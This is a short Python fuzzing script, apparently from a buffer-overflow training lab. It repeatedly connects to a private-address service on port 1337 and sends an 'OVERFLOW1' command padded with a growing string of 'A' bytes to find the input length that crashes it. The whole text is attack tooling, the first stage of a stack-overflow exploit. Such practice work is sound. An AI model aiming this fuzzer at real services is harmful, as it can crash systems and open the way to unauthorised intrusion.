import socket
import time

ip="10.10.102.218"
port=1337

prefix=b'OVERFLOW1 '

buf=b'A'*1950

while(True):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    payload=prefix+buf
    print(len(buf))
    s.sendall(payload)
    s.recv(1024)
    s.close
    buf+=b'A'
    time.sleep(0.17)
